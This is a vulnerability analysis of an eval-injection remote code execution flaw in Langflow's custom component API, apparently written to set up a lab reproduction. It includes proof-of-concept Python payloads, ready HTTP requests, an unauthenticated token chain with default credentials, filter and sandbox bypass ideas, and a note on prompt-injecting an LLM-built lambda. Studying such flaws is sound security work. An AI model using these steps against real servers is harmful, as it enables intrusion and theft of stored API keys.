# Vulnerability Analysis: CVE-2026-0769

## Root Cause

**CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)**

The root cause is the unrestricted use of Python's `exec()` builtin to execute user-supplied Python code received via HTTP API endpoints. The Langflow application accepts arbitrary Python source code strings through its custom component API and passes them directly to `exec()` without any sandboxing, code validation, allowlisting, or restriction on operations. The only "validation" is an `ast.parse()` call which only checks for syntactic correctness — it does not restrict dangerous operations.

The vulnerability is fundamental to Langflow's custom component architecture: the entire feature is designed to allow users to submit Python classes that are dynamically compiled and executed on the server. There is no security boundary between the custom component code and the server process.

Combined with the `AUTO_LOGIN=True` default configuration, this results in **unauthenticated Remote Code Execution (RCE)** on any default Langflow deployment.

## Vulnerable File(s) and Function(s)

### Primary Vulnerability Chain (CVE-2026-0769)

| File | Function | Lines | Role |
|---|---|---|---|
| `src/backend/base/langflow/api/v1/endpoints.py` | `custom_component()` | 653-672 | HTTP entry point — receives `code` field via POST |
| `src/backend/base/langflow/api/v1/endpoints.py` | `custom_component_update()` | 675-745 | Second HTTP entry point — receives `code` field via POST |
| `src/backend/base/langflow/custom/utils.py` | `build_custom_component_template()` | 393-446 | Template builder — calls `run_build_config()` → `eval_custom_component_code()` |
| `src/backend/base/langflow/custom/utils.py` | `run_build_config()` | 300-320 | Calls `eval_custom_component_code()` at line 311 |
| `src/backend/base/langflow/custom/utils.py` | `get_component_instance()` | 265-297 | Calls `eval_custom_component_code()` at line 272 |
| `src/backend/base/langflow/custom/eval.py` | `eval_custom_component_code()` | 9-12 | Orchestrator — calls `extract_class_name()` then `create_class()` |
| `src/backend/base/langflow/utils/validate.py` | `create_class()` | 172-216 | Prepends imports, parses AST, calls `prepare_global_scope()` and `build_class_constructor()` |
| `src/backend/base/langflow/utils/validate.py` | `prepare_global_scope()` | 232-295 | **EXEC #1** — Executes module-level definitions (assignments, functions, classes) via `exec()` at **line 293** |
| `src/backend/base/langflow/utils/validate.py` | `build_class_constructor()` | 326-349 | **EXEC #2** — Executes the class definition via `exec()` at **line 338** |

### Authentication Bypass Chain

| File | Function | Lines | Role |
|---|---|---|---|
| `src/backend/base/langflow/api/v1/login.py` | `auto_login()` | 80-120 | Returns superuser token with NO credentials when `AUTO_LOGIN=True` |
| `src/backend/base/langflow/services/settings/auth.py` | `AuthSettings` | 32 | `AUTO_LOGIN: bool = True` — **enabled by default** |
| `src/backend/base/langflow/services/settings/constants.py` | constants | 1-2 | Default superuser: `langflow`/`langflow` |
| `src/backend/base/langflow/services/auth/utils.py` | `api_key_security()` | 37-75 | When `AUTO_LOGIN=True`, returns superuser without checking any API key (line 45-53) |
| `src/backend/base/langflow/services/auth/utils.py` | `create_user_longterm_token()` | 232-252 | Creates 365-day access token for superuser |

## Triggering Input

### Minimum Viable Payload

The injected code must satisfy one constraint: it must contain a class that inherits from a base class with "Component" or "LC" in its name (checked by `extract_class_name()` at `validate.py:391-419`). This is a trivial requirement — the attacker just wraps their payload in a class skeleton.

**Module-level code execution** (simplest — executes in `prepare_global_scope()` at line 293):
```python
import os
os.system("id > /tmp/pwned")

from langflow.custom import Component
from langflow.io import Output

class Exploit(Component):
    display_name = "Exploit"
    outputs = [Output(name="output", display_name="Output", method="run")]
    def run(self):
        pass
```

**Class-body code execution** (executes in `build_class_constructor()` at line 338):
```python
from langflow.custom import Component
from langflow.io import Output
import os

class Exploit(Component):
    display_name = "Exploit"
    x = os.system("id > /tmp/pwned")
    outputs = [Output(name="output", display_name="Output", method="run")]
    def run(self):
        pass
```

The code executes in two stages:
1. `prepare_global_scope()` processes `ast.Import`, `ast.ImportFrom`, `ast.ClassDef`, `ast.FunctionDef`, and `ast.Assign` nodes. It compiles all definitions (class, function, assignment) into a single module and `exec()`s them (line 293). Module-level statements like `os.system("...")` that are top-level assignments or function calls execute here.
2. `build_class_constructor()` compiles the target class and `exec()`s it (line 338). Class-body statements (like `x = os.system(...)`) execute here.

### HTTP Request

```http
POST /api/v1/custom_component HTTP/1.1
Host: <target>:7860
Authorization: Bearer <token_from_auto_login>
Content-Type: application/json

{
  "code": "import os\nos.system('id > /tmp/pwned')\n\nfrom langflow.custom import Component\nfrom langflow.io import Output\n\nclass Exploit(Component):\n    display_name = \"Exploit\"\n    outputs = [Output(name=\"output\", display_name=\"Output\", method=\"run\")]\n    def run(self):\n        pass"
}
```

## Attack Scenario

### Step-by-step exploitation:

1. **Obtain authentication token (no credentials needed)**:
   ```
   GET /api/v1/auto_login HTTP/1.1
   Host: <target>:7860
   ```
   Response returns: `{"access_token": "<JWT>", "refresh_token": null, "token_type": "bearer"}`
   The token is valid for **365 days** and belongs to the default **superuser** account.

2. **Send malicious custom component code**:
   ```
   POST /api/v1/custom_component HTTP/1.1
   Host: <target>:7860
   Authorization: Bearer <JWT_from_step_1>
   Content-Type: application/json

   {"code": "<malicious_python_code_with_Component_subclass>"}
   ```

3. **Code executes immediately** on the server during the request processing:
   - `prepare_global_scope()` processes imports via `importlib.import_module()` and executes definitions via `exec()` (line 293)
   - `build_class_constructor()` executes the class via `exec()` (line 338)
   - The exec'd code runs with full privileges of the Langflow backend process (typically root in Docker)

4. **Attacker achieves RCE** — can read files, exfiltrate data, install backdoors, pivot to other systems, etc.

## Impact

- **Confidentiality**: COMPLETE — Attacker can read any file on the server, access environment variables (including API keys for OpenAI, AWS, etc. stored in Langflow's variable service), and exfiltrate data.
- **Integrity**: COMPLETE — Attacker can modify any file, install backdoors, alter application behavior, and manipulate stored flows.
- **Availability**: COMPLETE — Attacker can crash the service, delete data, or hold the system for ransom.
- **CVSS 3.0**: 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

The vulnerability is exploitable by **remote, unauthenticated attackers** against default Langflow deployments. The exec'd code runs as the backend process user, which is typically **root** in the official Docker image.

## Authentication Requirements

### Default configuration (AUTO_LOGIN=True — default)

**No real authentication is required.** The full exploit flow:

1. `GET /api/v1/auto_login` — returns a valid 365-day superuser JWT with no credentials
2. Use the JWT as `Authorization: Bearer <token>` in subsequent requests

The token format is a standard JWT:
```json
{
  "sub": "<user_uuid>",
  "type": "access",
  "exp": <timestamp_365_days_from_now>
}
```

Signed with HS256 using the server's `SECRET_KEY` (auto-generated if not set).

### Alternative auth paths (all work with AUTO_LOGIN=True):

- **Cookie-based**: The `auto_login` endpoint also sets an `access_token_lf` cookie. Subsequent requests can use this cookie instead of the Authorization header.
- **API key bypass**: The `api_key_security()` dependency in `services/auth/utils.py` (line 45) automatically returns the superuser when `AUTO_LOGIN=True`, without checking any API key. This means the `/api/v1/run/{flow_id}` endpoint (which uses `api_key_security`) is also exploitable without any key.

### If AUTO_LOGIN=False:

The attacker needs valid credentials. Default superuser is `langflow`/`langflow` (defined in `services/settings/constants.py`). Login via `POST /api/v1/login` with form data `username=langflow&password=langflow`.

## Fix Assessment

**There is no fix. This is a 0-day vulnerability.**

- **Fix Commit**: NONE
- **Patched Version**: NONE (vulnerability present through v1.8.0, the latest release)
- **ZDI Timeline**: Reported July 18, 2025. Published January 9, 2026 after vendor failed to respond to multiple follow-ups.

The vulnerability is architectural — `exec()` of user-supplied code is the intentional design of the custom component system. A proper fix would require either:
1. Running user code in a sandboxed environment (e.g., isolated subprocess, container, seccomp, or a Python sandbox like RestrictedPython)
2. Implementing a strict allowlist of permitted AST node types and blocking dangerous operations
3. Removing the ability to execute arbitrary code entirely

Since no fix exists, there is nothing to bypass. The vulnerability is fully exploitable as-is.

## Potential Bypass Vectors

Not applicable — there is no fix to bypass. However, the following considerations apply for future mitigation:

- **AST-based filtering**: If a fix were to use AST analysis to block dangerous nodes (e.g., blocking `import os`), it could be bypassed via:
  - `__import__('os')` in expressions
  - `getattr(__builtins__, '__import__')('os')`
  - `exec()` or `eval()` within class bodies
  - Metaclass abuse: `type.__subclasses__()` → traversal to `os._wrap_close` etc.
  - Module attribute access: `importlib.import_module('subprocess')`
- **Import-based filtering**: The `prepare_global_scope()` function uses `importlib.import_module()` to process imports. Even if direct `import os` were blocked, the code could use langchain/langflow's own imports to access dangerous functionality.
- **RestrictedPython**: Python sandbox escape techniques are well-documented and difficult to defend against comprehensively.

## Escalation Path

The vulnerability directly provides **arbitrary code execution** as the backend process user. This is already the maximum impact — no escalation chain is needed. However, specific high-value targets accessible from the exec context include:

1. **Environment variables**: Langflow stores cloud API keys (OpenAI, AWS, Anthropic, etc.) as environment variables (listed in `services/settings/constants.py` lines 3-31). The attacker can read all of them via `os.environ`.
2. **Database access**: The SQLite database (or configured external database) contains all user credentials, flows, and API keys. Accessible via file read or SQLAlchemy session.
3. **Docker socket**: If the Docker socket is mounted (common in docker-compose setups), the attacker can escape to the host.
4. **Network pivot**: The attacker can use the server as a pivot point to access internal services.

## Related Attack Surface

The same `exec()` vulnerability pattern exists in multiple other code paths within Langflow. Each represents an independent attack vector:

### 1. `/api/v1/validate/code` endpoint
**File**: `src/backend/base/langflow/api/v1/validate.py` (lines 13-23)
**Code**: `validate_code(code.code)` → `validate.py:57`: `exec(code_obj)` on FunctionDef nodes
**Trigger**: `POST /api/v1/validate/code` with `{"code": "<python_with_function>"}` — executes function definitions to "validate" them
**Auth**: Requires `CurrentActiveUser` (bypassed via AUTO_LOGIN)

### 2. `validate_code()` function — FunctionDef exec
**File**: `src/backend/base/langflow/utils/validate.py` (lines 24-63)
**Code**: Line 57: `exec(code_obj)` — compiles and executes each `ast.FunctionDef` node found in the code
**Note**: This is a separate exec path from `create_class()`. It blindly executes any function definition in the submitted code.

### 3. `eval_function()` — arbitrary function string exec
**File**: `src/backend/base/langflow/utils/validate.py` (lines 66-83)
**Code**: Line 71: `exec(function_string, namespace)` — executes an entire function string in a new namespace
**Note**: Takes a raw function string and exec's it. Any caller passing user input would be vulnerable.

### 4. `execute_function()` — function exec with arguments
**File**: `src/backend/base/langflow/utils/validate.py` (lines 86-121)
**Code**: Line 96-100: `exec()` on import statements; Line 113: `exec(code_obj, exec_globals, exec_locals)` on function code
**Note**: Multiple exec calls processing both imports and function bodies.

### 5. `create_function()` — function creation via exec
**File**: `src/backend/base/langflow/utils/validate.py` (lines 124-169)
**Code**: Line 158: `exec(code_obj, exec_globals, exec_locals)` — executes compiled function code
**Note**: Similar pattern to `create_class()` but for standalone functions.

### 6. `PythonCodeStructuredTool.build_tool()` — tool code exec
**File**: `src/backend/base/langflow/components/tools/python_code_structured_tool.py` (lines 146-229)
**Code**:
- Line 158: `exec(import_code, globals())` — dynamic imports
- Line 159: `exec(self.tool_code, globals(), local_namespace)` — tool code execution
- Line 184: `exec("\n".join(class_dict["code"]), globals_)` — class code execution
- Line 204: `exec(f"temp_annotation_type = {field_annotation}", globals_)` — annotation type evaluation
**Trigger**: Requires a flow with PythonCodeStructuredTool component containing malicious `tool_code` input
**Note**: Four separate exec calls in a single function, all operating on user-controllable input

### 7. `LambdaFilterComponent.filter_data()` — eval of LLM-generated lambda
**File**: `src/backend/base/langflow/components/processing/lambda_filter.py` (line 148)
**Code**: `fn: Callable[[Any], Any] = eval(lambda_text)` — evaluates a lambda string
**Note**: The lambda is generated by an LLM but based on user instructions. Indirect code injection via prompt injection on the LLM.

### 8. `code_parser.py` — dynamic imports via exec
**File**: `src/backend/base/langflow/custom/code_parser/code_parser.py` (lines 144-152)
**Code**:
- Line 144: `exec(f"import {module}", eval_env)`
- Line 145: `exec(f"from {module} import {name}", eval_env)`
- Line 152: `exec(f"import {module} as {alias or module}", eval_env)`
**Note**: Format string interpolation into exec — if `module` or `name` are user-controllable, this allows injection.

### 9. `io/schema.py` — eval of Literal type strings
**File**: `src/backend/base/langflow/io/schema.py` (lines 101, 139)
**Code**: `field_type = eval(literal_string, {"Literal": Literal})` — evaluates type annotation strings
**Note**: Limited scope (only `Literal` in namespace) but still an eval of potentially user-influenced data.

### 10. `helpers/flow.py` — dynamic flow function exec
**File**: `src/backend/base/langflow/helpers/flow.py` (line 207)
**Code**: `exec(compiled_func, globals(), local_scope)` — executes a dynamically generated flow function
**Note**: The function body is constructed from flow data; if flow data is user-controlled, this is exploitable.

### 11. `base_component.py` — build_template_config exec
**File**: `src/backend/base/langflow/custom/custom_component/base_component.py` (line 106)
**Code**: `cc_class = eval_custom_component_code(self._code)` — same eval chain as the main vulnerability
**Note**: Called from `build_template_config()` which is invoked during component initialization.

## Build System

| Field | Value |
|---|---|
| **Language** | Python 3.10-3.13 |
| **Build System** | hatchling (pyproject.toml) |
| **Package Manager** | pip / uv |
| **Workspace Structure** | Monorepo: `langflow` (root) + `langflow-base` (src/backend/base) |

## Build Commands

### Option 1: Docker Image (RECOMMENDED for lab)
```bash
docker pull langflowai/langflow:1.3.2
docker run -d -p 7860:7860 --name langflow langflowai/langflow:1.3.2
```

### Option 2: pip install
```bash
pip install langflow==1.3.2
langflow run --host 0.0.0.0 --port 7860
```

### Option 3: From source
```bash
cd src/backend/base
pip install -e .
cd ../../..
pip install -e .
langflow run --host 0.0.0.0 --port 7860
```

## Dependencies

### Runtime Dependencies (pip)
- `fastapi>=0.115.2` — Web framework
- `uvicorn>=0.30.0` — ASGI server
- `langchain~=0.3.10` — LLM framework
- `pydantic~=2.10.1` — Data validation
- `sqlmodel==0.0.22` — Database ORM
- `python-jose>=3.3.0` — JWT tokens
- `passlib>=1.7.4` — Password hashing
- `bcrypt==4.0.1` — Password hashing backend
- `langflow-base==0.3.2` — Core backend (contains vulnerable code)

### System Dependencies
- Python 3.12 (recommended)
- No additional system packages required for default setup

## Runtime Requirements

| Requirement | Details |
|---|---|
| **Default Port** | 7860 |
| **Default Host** | 0.0.0.0 |
| **Database** | SQLite (default, no external DB needed) |
| **Authentication** | AUTO_LOGIN=True by default — no configuration needed |
| **Environment Variables** | None required for PoC (AUTO_LOGIN handles auth) |
| **Network** | Single port (7860) — HTTP API + WebSocket + Frontend |
| **Start Command** | `langflow run` or Docker container start |
| **Health Check** | `GET /health` returns `{"status": "alive"}` |
| **Ready Check** | `GET /api/v1/version` returns version info |
| **Docker Image** | `langflowai/langflow:1.3.2` (amd64 + arm64, available on Docker Hub) |
